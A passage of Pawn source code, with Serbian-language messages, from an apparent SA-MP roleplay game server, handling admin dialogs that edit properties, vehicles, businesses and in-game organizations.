		format( string, sizeof( string ), "Admin %s je promenio cenu imovine(ID:%d) u %d", ImeIgraca( playerid ), imovina, cena );
		LogSave( "Ostalo/LogEdit.log", string );
	}
	else if( dialogid == dialog_IOPEN && response ) {
	    new id, ImaFajl[ 40 ];
		if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_IOPEN, DSI, D_NASLOV, "Unesite id imovine koju zelite otkljucati.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), IM_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
		II[ id ][ iLocked ] = 0; GameTextForPlayer( playerid, "Imovina ~g~otkljucana!", 3000, 3 );
		SaveProperty( id ) ;
		SendInfoMessage( playerid, "Otkljucali ste imovinu(ID: %d )!", id );
	}
	else if( dialogid == dialog_ICLOSE && response ) {
	    new id, ImaFajl[ 40 ];
		if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_ICLOSE, DSI, D_NASLOV, "Unesite id imovine koju zelite zakljucati.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), IM_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
		II[ id ][ iLocked ] = 1; GameTextForPlayer( playerid, "Imovina ~r~zakljucana!", 3000, 3 );
		SaveProperty( id ) ;
		SendInfoMessage( playerid, "Zakljucali ste imovinu(ID: %d )!", id );
	}
	else if( dialogid == dialog_ISELL && response ) {
	    new id, ImaFajl[ 40 ];
		if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_ISELL, DSI, D_NASLOV, "Unesti id imovine koju zelite prodati", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), IM_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
		II[ id ][ iOwned ] = 0;
        II[ id ][ iNeaktivnost ] = 0;
    	strmid( II[ id ][ iOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
    	SaveProperty( id ); PropertyRefresh( id );
    	SendInfoMessage( playerid, "Prodali ste imovinu(ID: %d )!", id );
    	new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je prodao imovinu(ID:%d)", ImeIgraca( playerid ), id );
		LogSave( "Ostalo/LogEdit.log", string );
    }
	else if( dialogid == dialog_VEDIT ) {
	    if( !response ) return true;
        if( response ) {
		    if( listitem ==  0 ) {
		        SPD( playerid, dialog_VPRICE, DSI, D_NASLOV, "Unesite zeljenu cenu vozila!", D_ODABERI, D_ODUSTANI );
		    }
		    if( listitem == 1 ) {
    			if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
    			if(!PrivatnoVozilo(GetPlayerVehicleID(playerid))) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u privatnom vozilu." );

				new autoid = getVehicleScriptID( GetPlayerVehicleID( playerid ) ), Float:Pos[ 4 ];

                GetVehiclePos( VehicleInfo[ autoid ][ vID ], Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				GetVehicleZAngle( VehicleInfo[ autoid ][ vID ], Pos[ 3 ] );

		        VehicleInfo[ autoid ][ vVirtualWorld ] = GetPlayerVirtualWorld( playerid );
				VehicleInfo[ autoid ][ vInterior ] = GetPlayerInterior( playerid );

				VehicleInfo[ autoid ][ vLokacijaX ] = Pos[ 0 ];
				VehicleInfo[ autoid ][ vLokacijaY ] = Pos[ 1 ];
				VehicleInfo[ autoid ][ vLokacijaZ ] = Pos[ 2 ];
				VehicleInfo[ autoid ][ vLokacijaA ] = Pos[ 3 ];

		        Novi_DestroyVehicle( VehicleInfo[ autoid ][ vID ] );
				VehicleInfo[ autoid ][ vID ] = V01D_CreateVehicle(VehicleInfo[ autoid ][ vModel ], VehicleInfo[ autoid ][ vLokacijaX ], VehicleInfo[ autoid ][ vLokacijaY ], VehicleInfo[ autoid ][ vLokacijaZ ]+1.0, VehicleInfo[ autoid ][ vLokacijaA ], VehicleInfo[ autoid ][ vColor1 ], VehicleInfo[ autoid ][ vColor2 ], 300000 );
				LinkVehicleToInterior( VehicleInfo[ autoid ][ vID ], VehicleInfo[ autoid ][ vInterior ] );
		    	SetVehicleVirtualWorld( VehicleInfo[ autoid ][ vID ], VehicleInfo[ autoid ][ vVirtualWorld ] );

		        TuneVehicle( autoid );

				SetVehicleParamsEx( VehicleInfo[ autoid ][ vID ], 0, 0, 0, VehicleInfo[ autoid ][ vLocked ], 0, 0, 0 );
				if( IsVehicleBajs( VehicleInfo[ autoid ][ vID ] ) ) {
					SetVehicleParamsEx( VehicleInfo[ autoid ][ vID ], 1, 0, 0, VehicleInfo[ autoid ][ vLocked ], 0, 0, 0 );
				}

				SaveVehicle( autoid );

				SendInfoMessage( playerid, "Preparkirali ste vozilo. ID = %d.", autoid );

		    }
		    if( listitem == 2 ) {
		        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");

    			if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
                if(!PrivatnoVozilo(GetPlayerVehicleID(playerid))) return SendErrorMessage( playerid, "Nisi u nijednom privatnom vozilu." );


            	new izbor = getVehicleScriptID( GetPlayerVehicleID( playerid ));

			    strmid( VehicleInfo[ izbor ][ vOwner ], "Drzava", 0, strlen( "Drzava" ), 24 );

				SendInfoMessage( playerid, "Prodali ste vozilo. ID = %d. ( obrisano je )", izbor ); //prodaja test

				new autoid = getVehicleScriptID ( GetPlayerVehicleID( playerid ) );

                Novi_DestroyVehicle( VehicleInfo[ autoid ][ vID ] );
                ResetVehicle( autoid );
                ObrisiVozilo( autoid );

		    }
		    if( listitem == 3 ) {
		        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");

    			if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
    			if(!PrivatnoVozilo(GetPlayerVehicleID(playerid))) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u privatnom vozilu." );

				SPD( playerid, dialog_VCOLOR, DSI, D_NASLOV, "Unesite zeljeni ide boje1 i id boje 1. Primer: 2 2!", D_ODABERI, D_ODUSTANI );
			}
		}
	}
	else if( dialogid == dialog_VCOLOR && response ) {
	    new boja1, boja2;

    	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
    	if(!PrivatnoVozilo(GetPlayerVehicleID(playerid))) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u privatnom vozilu." );

		if( sscanf( inputtext, "dd", boja1, boja2 ) ) return SPD( playerid, dialog_VCOLOR, DSI, D_NASLOV, "Unesite zeljeni ide boje1 i id boje 1. Primer: 2 2!", D_ODABERI, D_ODUSTANI );

        new autoid = getVehicleScriptID( GetPlayerVehicleID( playerid ) );

        VehicleInfo[ autoid ][ vColor1 ] = boja1; VehicleInfo[ autoid ][ vColor2 ] = boja2;
		SaveVehicle( autoid );

		ChangeVehicleColor( VehicleInfo[ autoid ][ vID ], boja1, boja2 );

		SendInfoMessage( playerid, "Prebojali ste vozilo. ID = %d. u boje %d %d", autoid, boja1, boja2 );
	}
	else if( dialogid == dialog_VPRICE && response ) {
	    new cena;

    	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
        if(!PrivatnoVozilo(GetPlayerVehicleID(playerid))) return SendErrorMessage( playerid, "Nisi u nijednom privatnom vozilu." );
		if( sscanf( inputtext, "d", cena ) ) return SPD( playerid, dialog_VPRICE, DSI, D_NASLOV, "Unesite zeljenu cenu vozila!", D_ODABERI, D_ODUSTANI );

        new autoid = getVehicleScriptID( GetPlayerVehicleID( playerid ) );

		VehicleInfo[ autoid ][ vPrice ] = cena; SaveVehicle( autoid );
		SendInfoMessage( playerid, "Promenili ste cenu vozila. ID = %d | Cena = %d.", autoid, cena );
	}
	else if( dialogid == dialog_FEDIT ) {
	    if( !response ) return true;
        if( response ) {
		    if( listitem ==  0 ) {
		    	SPD( playerid, dialog_FNAME, DSI, D_NASLOV, "Unesite id i zeljeno ime firme!", D_ODABERI, D_ODUSTANI ); }
		    if( listitem ==  1 ) {
		        SPD( playerid, dialog_FOPEN, DSI, D_NASLOV, "Unesite id firme koju zelite otkljucati.", D_ODABERI, D_ODUSTANI ); }
		    if( listitem ==  2 ) {
		        SPD( playerid, dialog_FCLOSE, DSI, D_NASLOV, "Unesite id firme koju zelite zakljucati.", D_ODABERI, D_ODUSTANI ); }
		    if( listitem ==  3 ) {
		        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
		        SPD( playerid, dialog_FSELL, DSI, D_NASLOV, "Unesti id firme koju zelite prodati", D_ODABERI, D_ODUSTANI ); }
	        if( listitem ==  4 ) {
		        SPD( playerid, dialog_FPROD, DSI, D_NASLOV, "Unesite id firme i broj produkata.", D_ODABERI, D_ODUSTANI ); }
		}
	}
	else if( dialogid == dialog_FNAME && response ) {
	    new id, ime[ 64 ], ImaFajl[ 40 ];
		if(sscanf( inputtext, "is[64]", id, ime ) ) return SPD( playerid, dialog_FNAME, DSI, D_NASLOV, "Unesite id i zeljeno ime firme!", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), F_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta firma ne postoji." );
		strmid( BussinesInfo[ id ][ bName ], ime, 0, strlen( ime ), 128);
		SaveBussines( id ) ; Bussines_Refresh( id );
		SendInfoMessage( playerid, "Promenili ste ime firme(ID: %d ) u %s!", id, ime );
	}
	else if( dialogid == dialog_FOPEN && response ) {
	    new id, ImaFajl[ 40 ];
		if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_FOPEN, DSI, D_NASLOV, "Unesite id firme koju zelite otkljucati.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), F_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta firma ne postoji." );
		BussinesInfo[ id ][ bLocked ] = 0; GameTextForPlayer( playerid, "Firma ~g~otkljucana!", 3000, 3 );
		SaveBussines( id ) ;
		SendInfoMessage( playerid, "Otkljucali ste firmu(ID: %d )!", id );
	}
	else if( dialogid == dialog_FCLOSE && response ) {
	    new id, ImaFajl[ 40 ];
		if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_FCLOSE, DSI, D_NASLOV, "Unesite id firme koju zelite zakljucati.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), F_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta firma ne postoji." );
		BussinesInfo[ id ][ bLocked ] = 1; GameTextForPlayer( playerid, "Firma ~r~zakljucana!", 3000, 3 );
		SaveBussines( id ) ;
		SendInfoMessage( playerid, "Zakljucali ste firmu(ID: %d )!", id );
	}
	else if( dialogid == dialog_FSELL && response ) {
	    new id, ImaFajl[ 40 ];
		if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_FSELL, DSI, D_NASLOV, "Unesti id firme koju zelite prodati", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), F_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta firma ne postoji." );
		BussinesInfo[ id ][ bOwned ] = 0;
    	strmid( BussinesInfo[ id ][ bOwner], "Drzava", 0, strlen( "Drzava" ), 32);
    	SaveBussines( id ); Bussines_Refresh( id );
    	BussinesInfo[ id ][ bNeaktivnost ] = 0;
    	SendInfoMessage( playerid, "Prodali ste firmu(ID: %d )!", id );
    }
	else if( dialogid == dialog_FPROD && response ) {
	    new id, prod, ImaFajl[ 40 ];
		if(sscanf( inputtext, "ii", id, prod ) ) return SPD( playerid, dialog_FPROD, DSI, D_NASLOV, "Unesite id firme i broj produkata.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), F_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta firma ne postoji." );
		BussinesInfo[ id ][ bProducts ] = prod;
		SaveBussines( id ) ;
		SendInfoMessage( playerid, "Postavili ste %d produkta firmi(ID: %d )!", prod, id );
	}
	else if( dialogid == dialog_VCREATE ) {
	    if( response ) {
	        if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SCM( playerid, SVETLOCRVENA, "| V:AC | Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
		    new idauta, Float:PozX, Float:PozY, Float:PozZ, Float:PozA, boja1, boja2;
		    GetPlayerPos( playerid, PozX, PozY, PozZ );
		    GetPlayerFacingAngle( playerid, PozA );
		    if(carspawntimer == 1) {
				SCM( playerid, CRVENA, "Pokusajte za 3 sekunde. (Anticrash)");
				return 1;
		    }
		    if( sscanf( inputtext, "iii", idauta, boja1, boja2 ) ) return SPD( playerid, dialog_VCREATE, DSI, D_NASLOV, "Unesite id zeljenog vozila, id boje1, id boje2!", D_ODABERI, D_NAZAD );
			if( idauta < 400 || idauta > 611 ) return SPD( playerid, dialog_VCREATE, DSI, D_NASLOV, "Unesite id zeljenog vozila, id boje1, id boje2!", D_ODABERI, D_NAZAD );
			if( VehPrice[ idauta-400 ][ 1 ] == 0 ) return SendErrorMessage( playerid, "Vozilo sa unetim IDem se ne moze kreirati zbog nedefinisane cene." );
            if( boja1 < 0 || boja1 > 255 ) return SendErrorMessage( playerid, "Prva boja ne moze biti manja od 0 ili veca od 255.");
    		if( boja2 < 0 || boja2 > 255 ) return SendErrorMessage( playerid, "Druga boja ne moze biti manja od 0 ili veca od 255.");
			for( new i = 1; i < MAX_CARS; i++ ) {
			    new fileauta[ 40 ];
				format(fileauta, sizeof( fileauta ), V_FILE, i);
				if( !fexist( fileauta ) ) {
					VehicleInfo[ i ][ vOwned ] = 0;
					VehicleInfo[ i ][ vNeaktivnost ] = 0;
					VehicleInfo[ i ][ vKilometri ] = 0;
					VehicleInfo[ i ][ vMetri ] = 0;
                    VehicleInfo[ i ][ vCipovanje ] = 0;
					VehicleInfo[ i ][ vPrice ] = VehPrice[ idauta- 400 ][ 1 ];
					strmid( VehicleInfo[ i ][ vOwner ], "Drzava", 0, strlen("Drzava"), 32);
					VehicleInfo[ i ][ vLocked ] = 0;
					VehicleInfo[ i ][ vLokacijaX ] = PozX;
					VehicleInfo[ i ][ vLokacijaY ] = PozY;
					VehicleInfo[ i ][ vLokacijaZ ] = PozZ;
					VehicleInfo[ i ][ vLokacijaA ] = PozA;
					VehicleInfo[ i ][ vUsage ] = PRIVATNO_VOZILO;
					VehicleInfo[ i ][ vVirtualWorld ] = 0;
					VehicleInfo[ i ][ vInterior ] = 0;
					VehicleInfo[ i ][ vJob ] = 0;
					VehicleInfo[ i ][ vOrganization ] = 0;
					VehicleInfo[ i ][ vColor1 ] = boja1;
					VehicleInfo[ i ][ vColor2 ] = boja2;
					VehicleInfo[ i ][ vModel ] = idauta;
					VehicleInfo[ i ][ vReg ] = 0;
					VehicleInfo[ i ][ vTeh ] = 0;
					VehicleInfo[ i ][ vGPS ] = 0;
					VehicleInfo[ i ][ vOsiguranje ] = 5;
					VehicleInfo[ i ][ vLock ] = 0;
					VehicleInfo[ i ][ vAlarm ] = 0;
					VehicleInfo[ i ][ vTuned ] = 0;
					VehicleInfo[ i ][ vNeon ] = 0;
					VehicleInfo[ i ][ vImobilizator ] = 0;
					VehicleInfo[ i ][ vSpoiler ] = 0;
					VehicleInfo[ i ][ vHood ] = 0;
					VehicleInfo[ i ][ vRoof ] = 0;
					VehicleInfo[ i ][ vSkirt ] = 0;
					VehicleInfo[ i ][ vLamps ] = 0;
					VehicleInfo[ i ][ vNitro ] = 0;
					VehicleInfo[ i ][ vExhaust ] = 0;
					VehicleInfo[ i ][ vWheels ] = 0;
					VehicleInfo[ i ][ vStereo ] = 0;
					VehicleInfo[ i ][ vHydraulics ] = 0;
					VehicleInfo[ i ][ vFrontBumper ] = 0;
					VehicleInfo[ i ][ vRearBumper ] = 0;
					VehicleInfo[ i ][ vVents ] = 0;
					VehicleInfo[ i ][ vPaintJob ] = 255;
					VehicleInfo[ i ][ vProvera ] = i;
					VehicleInfo[ i ][ vDrug ][ 0 ] = 0; VehicleInfo[ i ][ vDrug ][ 1 ] = 0; VehicleInfo[ i ][ vDrug ][ 2 ] = 0; VehicleInfo[ i ][ vDrug ][ 3 ] = 0; VehicleInfo[ i ][ vDrug ][ 4 ] = 0; VehicleInfo[ i ][ vDrug ][ 5 ] = 0;
					VehicleInfo[ i ][ vDrugCode ][ 0 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 1 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 2 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 3 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 4 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 5 ] = 0;
	                VehicleInfo[ i ][ vMelee ] = 0; VehicleInfo[ i ][ vWeap1 ] = 0; VehicleInfo[ i ][ vAmmo1 ] = 0; VehicleInfo[ i ][ vWeap2 ] = 0; VehicleInfo[ i ][ vAmmo2 ] = 0;
	                VehicleInfo[ i ][ vGajbica ][ 0 ] = -1; VehicleInfo[ i ][ vGajbica ][ 1 ] = -1; VehicleInfo[ i ][ vGajbica ][ 2 ] = -1; VehicleInfo[ i ][ vGajbica ][ 3 ] = -1; VehicleInfo[ i ][ vGajbica ][ 4 ] = -1;
					VehicleInfo[ i ][ vGajbicaAmmount ][ 0 ] = 0; VehicleInfo[ i ][ vGajbicaAmmount ][ 1 ] = 0; VehicleInfo[ i ][ vGajbicaAmmount ][ 2 ] = 0; VehicleInfo[ i ][ vGajbicaAmmount ][ 3 ] = 0; VehicleInfo[ i ][ vGajbicaAmmount ][ 4 ] = 0;
                    Novi_DestroyVehicle(VehicleInfo[i][vID]);
					VehicleInfo[ i ][ vID ] = V01D_CreateVehicle(VehicleInfo[ i ][ vModel ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ]+1.0, VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], 300000 );
                    LinkVehicleToInterior( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vInterior ] );
                	SetVehicleVirtualWorld( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vVirtualWorld ] );
					VehicleInfo[ i ][ vFuel ] = getAmountFuel( VehicleInfo[ i ][ vID ] ); vCanDrive[ VehicleInfo[ i ][ vID ] ] = 1; Fuel[ VehicleInfo[ i ][ vID ] ] = getAmountFuel( VehicleInfo[ i ][ vID ] ); 
					SetVehicleNumberPlate( VehicleInfo[ i ][ vID ], "NEMA" ); UnLockCar( VehicleInfo[ i ][ vID ] );
		            SaveVehicle( i ); SendInfoMessage( playerid, "Uspesno ste kreirali vozilo: ID Auta: %d, Cena: %d",idauta, VehPrice[ idauta- 400 ][ 1 ] );
	                carspawntimer = 1; ResetVehicleStatistics( VehicleInfo[ i ][ vID ] );
	     			SetTimer("AntiSpawnCrash", 3000, 0);
	     			SetVehicleParamsEx( VehicleInfo[ i ][ vID ], 0, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
		            if( IsVehicleBajs( VehicleInfo[ i ][ vID ] ) ) {
						SetVehicleParamsEx( VehicleInfo[ i ][ vID ], 1, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
					}
					break;
				}
			}
		}
	}
	
	else if( dialogid == dialog_ORGEDIT ) {
	    if( listitem ==  0 ) {
	    	SPD( playerid, dialog_ORGNAME, DSI, D_NASLOV, "Unesite id i zeljeno ime vase organizacije!", D_ODABERI, D_ODUSTANI ); }
	    if( listitem ==  1 ) {
	        if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
	        SPD( playerid, dialog_ORGINT1, DSL, D_NASLOV, "Default Interior\nUnesi sam kordinate\nInterior bande\nInterior mafije\nInterior hitmana\nInterior taksista\nInterior bolnice\nInterior novinara\nInterior Policije\nInteriror Mafija 2\nInterior Banda 2\nFBI Interior", D_ODABERI, D_ODUSTANI ); }
	    if( listitem ==  2 ) {
	        if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
	        SPD( playerid, dialog_ORGRANKS, DSL, D_NASLOV, "Rank 1\nRank 2\nRank 3\nRank 4\nRank 5\nRank 6", D_ODABERI, D_ODUSTANI ); }
	    if( listitem ==  3 ) {
	        if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
	        SPD( playerid, dialog_ORGTIP, DSL, D_NASLOV, "Tip: PD/FBI/CIA\nTip: Banda\nTip: Mafija\nTip: Bajkeri\nTip: Raceri\nTip: Bolnicari\nTip: Novinari\nTip: Hitmani\nTip: Elektricari\nTip: Taksisti", D_ODABERI, D_ODUSTANI ); }
        if( listitem ==  4 ) {
            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
            SPD( playerid, dialog_ORGSKINS, DSI, D_NASLOV, "Unesite id-ove muskih skinova za rankove koje zelite:\n Mora biti 6 id-a(rank1-6)\nPrimer: 1 2 3 4 5 6", D_ODABERI, D_ODUSTANI ); }
        if( listitem ==  5 ) {
            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
            SPD( playerid, dialog_ORGPREFIX, DSI, D_NASLOV, "Unesite skracenicu organizacije. Primer: LSPD", D_ODABERI, D_ODUSTANI ); }
        if( listitem ==  6 ) {
            SPD( playerid, dialog_ORGDUTYP, DSI, D_NASLOV, "Unesti ID organizacije za koju pravite duty point.", D_ODABERI, D_ODUSTANI ); }
        if( listitem ==  7 ) {
			SPD( playerid, dialog_ORGEQUIPP, DSI, D_NASLOV, "Unesti ID organizacije za koju pravite equipment point.", D_ODABERI, D_ODUSTANI ); }
        if( listitem ==  8 ) {
			SPD( playerid, dialog_ORGPORTP, DSI, D_NASLOV, "Unesti ID orge, pozicije, int i virtual world gde ce se portati as ovog mesta\n\nPrimer: 12 2323.123 756.341 12.24 2 3.", D_ODABERI, D_ODUSTANI );
		}
		if( listitem == 9 ) {
            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
            SPD( playerid, dialog_ORGZSKINS, DSI, D_NASLOV, "Unesite id-ove zenskih skinova za rankove koje zelite:\n Mora biti 6 id-a(rank1-6)\nPrimer: 1 2 3 4 5 6", D_ODABERI, D_ODUSTANI );
		}
		if( listitem == 10 ) {
		    if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
			SPD( playerid, dialog_ORGMAXMEMB, DSI, D_NASLOV, "Unesti broj koliko ova orga moze imati maksimalno clanova(8-30)", D_ODABERI, D_ODUSTANI );
        }
        if( listitem == 11 ) {
		    if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
			new id = GetNearestOrganization( playerid );
			
			if( OI[ id ][ oTip ] == ORG_TIP_MAFIJA ) {
        		SPD( playerid, dialog_ORGDRUGCHOSE, DSL, "Izaberi org vrstu droge", "Heroin\nKokain\nPlavi Methamphetamine", D_ODABERI, D_ODUSTANI );
			}
			else if( OI[ id ][ oTip ] == ORG_TIP_BANDA || OI[ id ][ oTip ] == ORG_TIP_SR || OI[ id ][ oTip ] == ORG_TIP_MC ) {
	        	SPD( playerid, dialog_ORGDRUGCHOSE_2, DSL, "Izaberi org vrstu droge", "Marihuana\nCrack\nMethamphetamine", D_ODABERI, D_ODUSTANI );
			}
			else SendErrorMessage( playerid, "Ova opcija moze da se koristi samo za bande, bajkere, racere i mafije." );
        }
        if( listitem == 12 ) {
            if( inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u interijeru organizacije organizacije." );
			new id = inOrgInt[ playerid ], Float:Pos[ 3 ];
			
			GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		    OI[ id ][ oSafePos ][ 0 ] = Pos[ 0 ];
		    OI[ id ][ oSafePos ][ 1 ] = Pos[ 1 ];
		    OI[ id ][ oSafePos ][ 2 ] = Pos[ 2 ];

		    if( IsValidDynamic3DTextLabel( OrgSafe3d[ id ] ) )
				DestroyDynamic3DTextLabel( OrgSafe3d[ id ] );

			if( IsValidDynamicPickup( OrgSafePickup[ id ] ) )
				DestroyDynamicPickup( OrgSafePickup[ id ] );

		    new string[ 128 ];
		    format( string, sizeof( string ), ""col_white"Sef za koriscenje /orgsef\nDa opljackate sef /opljackajsef\n"col_crvena"%s", OI[ id ][ oName ] );
		    OrgSafe3d[ id ] = CreateDynamic3DTextLabel( string, -1, OI[ id ][ oSafePos ][ 0 ], OI[ id ][ oSafePos ][ 1 ], OI[ id ][ oSafePos ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oVw ], OI[ id ][ oInt ], -1, 20.0);
			OrgSafePickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oSafePos ][ 0 ], OI[ id ][ oSafePos ][ 1 ], OI[ id ][ oSafePos ][ 2 ], OI[ id ][ oVw ], OI[ id ][ oInt ], -1, 20.0 );

			SaveOrganization( id );
			SendInfoMessage( playerid, "Napravili ste sef za orgu %s.", OI[ id ][ oName ] );
        }
        if( listitem == 13 ) {
            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
            SPD( playerid, dialog_ORGCOLOR, DSI, D_NASLOV, "Unesite boju za organizaciju(Vezano za zone ). Primer: FF00FF", D_ODABERI, D_ODUSTANI );
		}
        if( listitem == 14) {

            SPD( playerid, dialog_ORGCOLOR, DSI, D_NASLOV, "Unesite boju za organizaciju(Vezano za zone ). Primer: FF00FF", D_ODABERI, D_ODUSTANI );
        }
        if( listitem == 15) {

            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
            new id = GetNearestOrganization( playerid );

            OI[ id ][ oDrugField ][ 0 ] = 0;
            OI[ id ][ oDrugField ][ 1 ] = 0;
            OI[ id ][ oDrugField ][ 2 ] = 0;
        
    
            if( IsValidDynamic3DTextLabel( OrgField3d[ id ] ) )
                DestroyDynamic3DTextLabel( OrgField3d[ id ] );

            if( IsValidDynamicPickup( OrgFieldPickup[ id ] ) )
                DestroyDynamicPickup( OrgFieldPickup[ id ] );

            SaveOrganization(id);
            SendInfoMessage(playerid, "Unistio si polje droge za organizaciju %s!", getOrgName(id));
        }
        if(listitem == 16) {
            SPD( playerid, dialog_SLABATACKA, DSI, D_NASLOV, "Unesti ID organizacije za koju pravite slabu tacku.", D_ODABERI, D_ODUSTANI );}
        
	}
	else if( dialogid == dialog_ORGRANKS ) {
	    if(listitem ==  0) {
	    	SPD( playerid, dialog_ORGRANK1, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 1 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	    if(listitem ==  1) {
	    	SPD( playerid, dialog_ORGRANK2, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 2 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	    if(listitem ==  2) {
	    	SPD( playerid, dialog_ORGRANK3, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 3 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	    if(listitem ==  3) {
	    	SPD( playerid, dialog_ORGRANK4, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 4 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	    if(listitem ==  4) {
	    	SPD( playerid, dialog_ORGRANK5, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 5 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	    if(listitem ==  5) {
	    	SPD( playerid, dialog_ORGRANK6, DSI, D_NASLOV, "U prazni prostor ispod unesite ime za rank 6 ove organizacije.", D_ODABERI, D_ODUSTANI ); }
	}
	else if( dialogid == dialog_ORGNAME && response ) {
        new id, ime[ ORG_IME ], ImaFajl[ 40 ];
		if(sscanf( inputtext, "is[64]", id, ime ) ) return SPD( playerid, dialog_ORGNAME, DSI, D_NASLOV, "Unesite id i zeljeno ime vase organizacije!", D_ODABERI, D_ODUSTANI);
        format( ImaFajl, sizeof( ImaFajl ), O_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji." );
		if( OrgKreiranje[ playerid ] == 0 ) {
			strmid( OI[ id ][ oName ], ime, 0, strlen( ime ), ORG_IME);
			SaveOrganization( id ); Orge3D( id );
			SendInfoMessage( playerid, "Promenili ste ime organizacije(ID: %d ) u %s!", id, ime ); }
	}
	else if( dialogid == dialog_ORGDUTYP && response ) {
        new id, ImaFajl[ 40 ], Float:Pos[ 3 ];
		if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_ORGDUTYP, DSI, D_NASLOV, "Unesti ID organizacije za koju pravite duty point.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), O_FILE, id );
